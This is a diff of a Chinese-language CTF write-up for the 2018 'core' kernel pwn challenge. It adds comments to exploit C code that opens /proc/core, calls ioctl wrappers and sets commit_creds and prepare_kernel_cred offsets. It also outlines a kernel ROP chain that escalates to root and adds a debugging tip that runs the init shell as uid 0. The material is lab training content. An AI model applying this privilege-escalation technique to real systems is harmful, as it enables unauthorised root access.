@@ -2,10 +2,11 @@
 layout: post
 title: 2018 kernel pwn core
 excerpt: "kernel pwn"
-categories: [未完待续]
+categories: [Writeup]
 comments: true
 ---
-https://xz.aliyun.com/t/5822#toc-0
+一篇kernelrop的完整流程 https://github.com/vnik5287/kernel_rop
+
 
 查看下保护
 ```c
@@ -84,7 +85,12 @@ int __fastcall core_read(__int64 a1, __int64 a2)
 - 通过设置合理的长度利用core_copy_func()函数把name的ROPchain向v2变量上写,进行ROP攻击
 - ROP调用commit_creds(prepare_kernel_cred(0))，然后swapgs，iretq到用户态;
 - 用户态起shell，get root;
-
+#### 调试小技巧
+为了方便调试,我们修改一下init文件:
+```
+- setsid /bin/cttyhack setuidgid 1000 /bin/sh
++ setsid /bin/cttyhack setuidgid 0 /bin/sh
+```
 ### 利用
 提权函数
 ```
@@ -204,17 +210,17 @@ int main(void){
 #include <sys/wait.h>
 #include <sys/ioctl.h>
 #include <pthread.h>
-void setoff(int fd,long long size){
+void setoff(int fd,long long size){		//不同的调用方法
 	ioctl(fd,0x6677889C,size);
 }
-void core_read(int fd,char *buf){
+void core_read(int fd,char *buf){		//不同的调用方法
 	ioctl(fd,0x6677889b,buf);
 }
-void core_copy_func(int fd,long long size){
+void core_copy_func(int fd,long long size){		//不同的调用方法
 	ioctl(fd,0x6677889a,size);
 }
 unsigned long user_cs, user_ss, user_eflags,user_sp	;
-void save_stats() {
+void save_stats() {							//保存一下用户态的数据
 	asm(
 		"movq %%cs, %0\n"
 		"movq %%ss, %1\n"
@@ -239,7 +245,7 @@ int main(){
 	size_t vmlinux_base,canary,module_core_base;
 	size_t commit_creds =  0x9c8e0;
 	size_t prepare_kernel_cred = 0x9cce0;
-	save_stats();
+	save_stats();							//首先保存用户态数据
 	fd = open("/proc/core",O_RDWR);
 	if(fd < 0 ){
 		printf("Open /proc/core error!\n");
